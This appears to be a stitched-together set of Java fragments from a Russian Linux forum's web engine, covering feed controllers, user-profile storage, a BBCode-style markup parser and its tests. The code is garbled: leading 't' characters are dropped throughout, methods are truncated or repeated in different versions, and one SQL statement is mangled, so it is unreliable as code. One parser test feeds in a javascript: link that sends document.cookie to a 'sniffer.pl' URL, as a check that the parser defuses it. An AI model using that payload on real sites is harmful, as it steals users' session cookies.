public ModelAndView agFeed ( HttpServletRequest request , HttpServletResponse response , @PathVariable String ag , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset , @RequestParam ( value = " section " , defaultValue = " 0 " ) int sectionId ) hrows Exception { Section section ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; } else { section = null ; } TopicListRequest opicListForm = new TopicListRequest ( ) ; opicListForm . setTag ( ag ) ; opicListForm . setOffset ( offset ) ; opicListForm . setSection ( sectionId ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ag " , ag ) ; modelAndView . addObject ( " section " , section ) ; modelAndView . addObject ( " offset " , offset ) ; modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , ag ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , ag ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , ag ) ) ; } } modelAndView . addObject ( " counter " , agService . getCounter ( ag ) ) ; modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( agService . getTagId ( ag ) ) ) ; if ( sectionId = = 0 ) { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( ag ) ) ; } else { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( ag ) + " ( " + section . getName ( ) + " ) " ) ; } modelAndView . setViewName ( " ag-topics " ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_GALLERY ) , opicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_FORUM ) , opicListForm ) ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_NEWS ) , opicListForm ) ) ; return modelAndView ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { TopicListRequest opicListForm = new TopicListRequest ( ) ; Section sectionObject = sectionService . getSectionByName ( section ) ; opicListForm . setSection ( sectionObject . getId ( ) ) ; opicListForm . setYear ( year ) ; opicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionObject , opicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; return modelAndView ; } 
private ModelAndView group ( HttpServletRequest request , TopicListRequest opicListForm , String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( opicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , group ) ; StringBuilder ptitle = new StringBuilder ( ) ; ptitle . append ( section . getName ( ) ) ; if ( group ! = null ) { ptitle . append ( " - " ) . append ( group . getTitle ( ) ) ; } modelAndView . addObject ( " ptitle " , ptitle . oString ( ) ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; return modelAndView ; } 
private String buildTagUri ( String ag , int section , int offset ) { UriComponentsBuilder builder = UriComponentsBuilder . fromUri ( TAG_URI_TEMPLATE . expand ( ag ) ) ; if ( section ! = 0 ) { builder . queryParam ( " section " , section ) ; } if ( offset ! = 0 ) { builder . queryParam ( " offset " , offset ) ; } return builder . build ( ) . oUriString ( ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " ango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , rue ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , rue ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { List < TagDTO > list = agDao . getTags ( TAGS_IN_CLOUD ) ; return new ModelAndView ( " boxlets/tagcloud " , " ags " , list ) ; } 
public static void setExpireHeaders ( HttpServletResponse response , Integer year , Integer month ) { if ( month = = null ) { response . setDateHeader ( " Expires " , System . currentTimeMillis ( ) + 60 * 1000 ) ; 
public int doStartTag ( ) hrows JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { ry { StringBuilder buf = new StringBuilder ( ) ; for ( String el : list ) { if ( buf . length ( ) > 0 ) { buf . append ( " , " ) ; } if ( TagService . isGoodTag ( el ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( TagTopicListController . agListUrl ( el ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el ) ) . append ( " </a> " ) ; } else { buf . append ( StringUtil . escapeHtml ( el ) ) ; } } out . append ( buf ) ; } catch ( IOException e ) { hrow new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
private ModelAndView redirectToListPage ( String agName ) { char firstLetter = agName . oLowerCase ( ) . charAt ( 0 ) ; String redirectUrl = TagTopicListController . agsUrl ( firstLetter ) ; return new ModelAndView ( new RedirectView ( redirectUrl ) ) ; } 
public View agFeedOld ( @RequestParam String ag ) { return new RedirectView ( TagTopicListController . agListUrl ( ag ) ) ; } 
public String renderNodeXhtml ( Node node ) { if ( NodeUtils . isEmptyNode ( node ) ) { return " " ; } StringBuilder ret = new StringBuilder ( ) ; if ( node . isParameter ( ) ) { String lang = node . getParameter ( ) . rim ( ) ; if ( langHash . containsKey ( lang ) ) { ret . append ( " <div class= \" code \" ><pre class= \" " ) . append ( langHash . get ( lang ) ) . append ( " \" ><code> " ) ; } else { ret . append ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code> " ) ; } } else { ret . append ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code> " ) ; } ret . append ( node . renderChildrenXHtml ( ) ) ; ret . append ( " </code></pre></div> " ) ; return ret . oString ( ) ; } 
public String renderNodeXhtml ( Node node ) { if ( NodeUtils . isEmptyNode ( node ) ) { return " " ; } StringBuilder ret = new StringBuilder ( ) ; ret . append ( " <span class= \" code \" ><code> " ) . append ( node . renderChildrenXHtml ( ) ) . append ( " </span></code> " ) ; return ret . oString ( ) ; } 
public void estInCodeQuotes ( ) { assertEquals ( " <p>Smth about &#171;quotes&#187;? Look here: <div class= \" code \" ><pre class= \" no-highlight \" ><code>I love to eat &quot;white&quot; icecream</code></pre></div></p> " , 
public void estLocalBuffer ( ) { assertEquals ( " <p>This is simple &#171;local <u>buffer</u>&#187; test </p> " , 
public void makeTitle ( ) { given when String actualResult = StringUtil.makeTitle("\"Test of \"quotes '' \"in quotes\" in title\"\""); then Assert.assertEquals("&#171;Test of &#8222;quotes &quot; &#8222;in quotes&#8221; in title&#8221;&#187;", actualResult); } 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&#171;http:127.0.0.1/sniffer.pl?&#187;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , false ) ) ; 
public List < PreparedGalleryItem > prepare ( List < GalleryItem > items ) { String htmlPath = configuration . getHTMLPathPrefix ( ) ; ImmutableList . Builder < PreparedGalleryItem > builder = ImmutableList . builder ( ) ; for ( GalleryItem item : items ) { ry { ImageInfo iconInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getIcon ( ) ) ; ImageInfo fullInfo = new ImageInfo ( htmlPath + item . getImage ( ) . getOriginal ( ) ) ; builder . add ( new PreparedGalleryItem ( item , userDao . getUserCached ( item . getUserid ( ) ) , iconInfo , fullInfo ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } catch ( FileNotFoundException e ) { logger . error ( " Image not found! id={}: {} " , item . getImage ( ) . getId ( ) , e . getMessage ( ) ) ; } catch ( BadImageException | IOException e ) { logger . error ( " Bad image id={} " , item . getImage ( ) . getId ( ) , e ) ; } } return builder . build ( ) ; } 
public UserDetails loadUserByUsername ( String username ) hrows UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , rue ) ; if ( user = = null ) { hrow new UsernameNotFoundException ( username ) ; } } else { ry { user = userDao . getUser ( username ) ; userDao . updateLastlogin ( user , false ) ; } catch ( UserNotFoundException e ) { hrow new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , profileDao . readProfile ( user ) ) ; } 
public Profile readProfile ( @NotNull User user ) { Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; InputStream df = null ; Map < String , Object > userProfile = null ; ry { df = storage . getReadStream ( " profile " , user . getNick ( ) ) ; ObjectInputStream dof = null ; ry { dof = new ObjectInputStream ( df ) ; userProfile = ( Map < String , Object > ) dof . readObject ( ) ; dof . close ( ) ; df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } finally { if ( dof ! = null ) { ry { dof . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } } } } catch ( StorageException | ClassNotFoundException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } finally { if ( df ! = null ) { ry { df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } } } ProfileProperties properties ; if ( userProfile ! = null ) { properties = new ProfileProperties ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , userProfile ) ) ; } else { properties = new ProfileProperties ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , Object > ( ) ) ) ; } return new Profile ( properties , false ) ; } 
public void writeProfile ( @NotNull User user , Profile profile ) hrows IOException , StorageException { ProfileHashtable profileHashtable = profile . getProperties ( ) . getHashtable ( ) ; profileHashtable . setObject ( ProfileProperties . TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; OutputStream df = storage . getWriteStream ( " profile " , user . getNick ( ) ) ; ry ( ObjectOutputStream dof = new ObjectOutputStream ( df ) ) { dof . writeObject ( profileHashtable . getSettings ( ) ) ; 
private static String fixFormat ( String mode ) { if ( ! " quot " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) AuthUtil . getDefaults ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String fixStyle ( String style ) { if ( ! DefaultProfile . isStyle ( style ) ) { return ( String ) AuthUtil . getDefaults ( ) . get ( STYLE_PROPERTY ) ; } return style ; } 
public void initTestUser ( ) { estUser = mock ( User . class ) ; when ( estUser . getNick ( ) ) . henReturn ( " est-user " ) ; } 
public void estDefaultProfileSave ( ) hrows Exception { Profile profile = new Profile ( ) ; profileDao . writeProfile ( estUser , profile ) ; Profile profile1 = profileDao . readProfile ( estUser ) ; assertFalse ( profile1 . isDefault ( ) ) ; } 
public void estModification ( ) hrows Exception { Profile profile = new Profile ( ) ; assertNotSame ( 125 , profile . getProperties ( ) . getMessages ( ) ) ; profile . getProperties ( ) . setMessages ( 125 ) ; profileDao . writeProfile ( estUser , profile ) ; Profile profile1 = profileDao . readProfile ( estUser ) ; assertEquals ( 125 , profile1 . getProperties ( ) . getMessages ( ) ) ; } 
public void createTempDir ( ) hrows IOException { empDir = Files . createTempDir ( ) ; Files . createParentDirs ( new File ( empDir , " linux-storage/profile/test " ) ) ; } 
public void dropTempDir ( ) hrows IOException { FileUtils . deleteDirectory ( empDir ) ; } 
public ProfileDao profileDao ( ) { return new ProfileDao ( ) ; } 
public ru . org . linux . spring . Configuration configuration ( ) { ru . org . linux . spring . Configuration mock = mock ( ru . org . linux . spring . Configuration . class ) ; when ( mock . getPathPrefix ( ) ) . henReturn ( empDir . getAbsolutePath ( ) + '/' ) ; return mock ; } 
public Properties properties ( ) { return new Properties ( ) ; } 
public Map < String , Object > getComments ( @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " page " , defaultValue = " 0 " ) int page , HttpServletRequest request ) hrows Exception { Topic opic = opicDao . getById ( msgid ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; if ( ! section . getUrlName ( ) . equals ( sectionName ) | | ! group . getUrlName ( ) . equals ( groupName ) | | page < 0 ) { hrow new MessageNotFoundException ( msgid ) ; } permissionService . checkView ( opic , AuthUtil . getCurrentUser ( ) ) ; CommentList comments = commentService . getCommentList ( opic , false ) ; CommentFilter cv = new CommentFilter ( comments ) ; int messagesPerPage = AuthUtil . getProfile ( ) . getMessages ( ) ; List < Comment > commentsFiltered = cv . getCommentsForPage ( false , page , messagesPerPage , ImmutableSet . < Integer > of ( ) ) ; List < PreparedComment > preparedComments = prepareService . prepareCommentList ( comments , commentsFiltered , request . isSecure ( ) , Template . getTemplate ( request ) , opic ) ; return ImmutableMap . of ( " comments " , preparedComments , 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > ags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; List < Integer > opicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , rue ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { String avatarMode = profile . getAvatarMode ( ) ; if ( " empty " . equals ( avatarMode ) ) { avatarMode = " mm " ; } userpic = userService . getUserpic ( message . getAuthor ( ) , secure , avatarMode ) ; } return new TopicMenu ( opicEditable , 
public static Profile createDefault ( ) { return new Profile ( new ProfileHashtable ( AuthUtil . getDefaults ( ) , new HashMap < String , Object > ( ) ) ) ; } 
public Profile readProfile ( @NotNull User user ) { Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; InputStream df = null ; Map < String , Object > userProfile = null ; ry { df = storage . getReadStream ( " profile " , user . getNick ( ) ) ; ObjectInputStream dof = null ; ry { dof = new ObjectInputStream ( df ) ; userProfile = ( Map < String , Object > ) dof . readObject ( ) ; dof . close ( ) ; df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } finally { if ( dof ! = null ) { ry { dof . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } } } } catch ( StorageException | ClassNotFoundException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } finally { if ( df ! = null ) { ry { df . close ( ) ; } catch ( IOException e ) { logger . info ( " Bad profile for user " + user . getNick ( ) ) ; } } } Profile properties ; if ( userProfile ! = null ) { properties = new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , userProfile ) ) ; } else { properties = new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , Object > ( ) ) ) ; } return properties ; } 
public void writeProfile ( @Nonnull User user , @Nonnull Profile profile ) hrows IOException , StorageException { ProfileHashtable profileHashtable = profile . getHashtable ( ) ; profileHashtable . setObject ( Profile . TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; Storage storage = new FileStorage ( configuration . getPathPrefix ( ) + " linux-storage/ " ) ; OutputStream df = storage . getWriteStream ( " profile " , user . getNick ( ) ) ; ry ( ObjectOutputStream dof = new ObjectOutputStream ( df ) ) { dof . writeObject ( profileHashtable . getSettings ( ) ) ; 
public void estModification ( ) hrows Exception { Profile profile = Profile . createDefault ( ) ; assertNotSame ( 125 , profile . getMessages ( ) ) ; profile . setMessages ( 125 ) ; profileDao . writeProfile ( estUser , profile ) ; Profile profile1 = profileDao . readProfile ( estUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; } 
public void estMain ( ) hrows IOException { ClientResponse cr = resource . path ( " / " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
public void estMain ( ) hrows IOException { ClientResponse cr = resource . path ( " /news/archive/2007/5 " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; List < String > boxnames = . getProf ( ) . getBoxlets ( ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " ango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , rue ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , rue ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public static Profile createDefault ( ) { return new Profile ( new ProfileHashtable ( AuthUtil . getDefaults ( ) , new HashMap < String , String > ( ) ) , null ) ; } 
public Profile readProfile ( @NotNull User user ) { List < Profile > profiles = jdbcTemplate . query ( " SELECT settings, main FROM user_settings WHERE id=? " , new RowMapper < Profile > ( ) { @Override public Profile mapRow ( ResultSet resultSet , int i ) hrows SQLException { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , Arrays . asList ( ( String [ ] ) boxes . getArray ( ) ) ) ; } else { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , null ) ; } } } , user . getId ( ) ) ; if ( profiles . isEmpty ( ) ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , String > ( ) ) , null ) ; 
public Profile mapRow ( ResultSet resultSet , int i ) hrows SQLException { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return new Profile ( 
public void deleteProfile ( @Nonnull User user ) { jdbcTemplate . update ( " DELETE FROM user_settings WHERE id=? " , user . getId ( ) ) ; } 
public void writeProfile ( @Nonnull final User user , @Nonnull final Profile profile ) { String boxlets [ ] = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . oArray ( new String [ customBoxlets . size ( ) ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( new PreparedStatementCreator ( ) { 
public PreparedStatement createPreparedStatement ( Connection con ) hrows SQLException { PreparedStatement st = con . prepareStatement ( " UPDATE user_settings SET settings=?, main=? WHERE id=? " ) ; st . setObject ( 1 , profile . getSettings ( ) ) ; if ( finalBoxlets ! = null ) { st . setArray ( 2 , con . createArrayOf ( " ext " , finalBoxlets ) ) ; } else { st . setNull ( 2 , Types . ARRAY ) ; } st . setInt ( 3 , user . getId ( ) ) ; return st ; } 
public PreparedStatement createPreparedStatement ( Connection con ) hrows SQLException { PreparedStatement st = con . prepareStatement ( " INSERT INTO user_settings (id, settings, main) VALUES (?,?,?g) " ) ; st . setInt ( 1 , user . getId ( ) ) ; st . setObject ( 2 , profile . getSettings ( ) ) ; if ( finalBoxlets ! = null ) { st . setArray ( 3 , con . createArrayOf ( " ext " , finalBoxlets ) ) ; } else { st . setNull ( 3 , Types . ARRAY ) ; } return st ; } 
public void initTestUser ( ) { estUser = mock ( User . class ) ; when ( estUser . getId ( ) ) . henReturn ( 1 ) ; } 
public void estModification ( ) hrows Exception { Profile profile = Profile . createDefault ( ) ; assertNotSame ( 125 , profile . getMessages ( ) ) ; profile . setMessages ( 125 ) ; profileDao . writeProfile ( estUser , profile ) ; Profile profile1 = profileDao . readProfile ( estUser ) ; profileDao . deleteProfile ( estUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; assertNull ( profile1 . getCustomBoxlets ( ) ) ; } 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String ext ) { if ( ! automatonState . isCode ( ) ) { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , parserParameters , ext , automatonState ) ) ; 
public String format ( String ext , boolean secure , boolean nofollow ) { return format ( ext , secure , nofollow , null ) ; } 
public String format ( String ext , boolean secure , boolean nofollow , RuTypoChanger changer ) { String escapedText = StringUtil . escapeHtml ( ext ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String oken = st . nextToken ( ) ; String formattedToken = formatURL ( oken , secure , nofollow , changer ) ; sb . append ( formattedToken ) ; } return sb . oString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
private String formatWithMagic ( String ext , RuTypoChanger changer ) { String ext2 = changer ! = null ? changer . format ( ext ) : ext ; return ext2 ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new CommentRequestValidator ( lorCodeService ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public boolean isEmptyTextComment ( String msg ) { return parseForOgDescription ( msg . rim ( ) ) . isEmpty ( ) ; } 
public PreparedStatement createPreparedStatement ( Connection con ) hrows SQLException { PreparedStatement st = con . prepareStatement ( " INSERT INTO user_settings (id, settings, main) VALUES (?,?,?) " ) ; st . setInt ( 1 , user . getId ( ) ) ; st . setObject ( 2 , profile . getSettings ( ) ) ; if ( finalBoxlets ! = null ) { st . setArray ( 3 , con . createArrayOf ( " ext " , finalBoxlets ) ) ; } else { st . setNull ( 3 , Types . ARRAY ) ; } return st ; } 
public void estReadEmpty ( ) hrows Exception { profileDao . deleteProfile ( estUser ) ; Profile profile = profileDao . readProfile ( estUser ) ; assertNull ( profile . getCustomBoxlets ( ) ) ; } 
public void estEmpty ( ) { assertTrue ( lorCodeService . isEmptyTextComment ( " [br] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [br] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [b] [br][/b][u] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [list][*][br][br][*][u][/u][/list] " ) ) ; assertTrue ( lorCodeService . isEmptyTextComment ( " [url] [/url][list][*][br][br][*][u][/u][/list][/url] " ) ) ; } 
public boolean apply ( String s ) { return DefaultProfile . isBox ( s ) ; } 
public static Predicate < String > boxPredicate ( ) { return isBoxPredicate ; } 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; List < String > boxnames = ImmutableList . copyOf ( Iterables . filter ( . getProf ( ) . getBoxlets ( ) , DefaultProfile . boxPredicate ( ) ) ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public String renderOg ( ) { return StringUtil . escapeForceHtml ( ext ) ; } 
public void estOg ( ) { assertEquals ( " hello " , lorCodeService . parseForOgDescription ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . parseForOgDescription ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . parseForOgDescription ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " &amp;#9618; " , lorCodeService . parseForOgDescription ( " [code]&#9618;[/code] " ) ) ; String xt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . parseForOgDescription ( xt ) ) ; assertEquals ( 250 + 3 , 
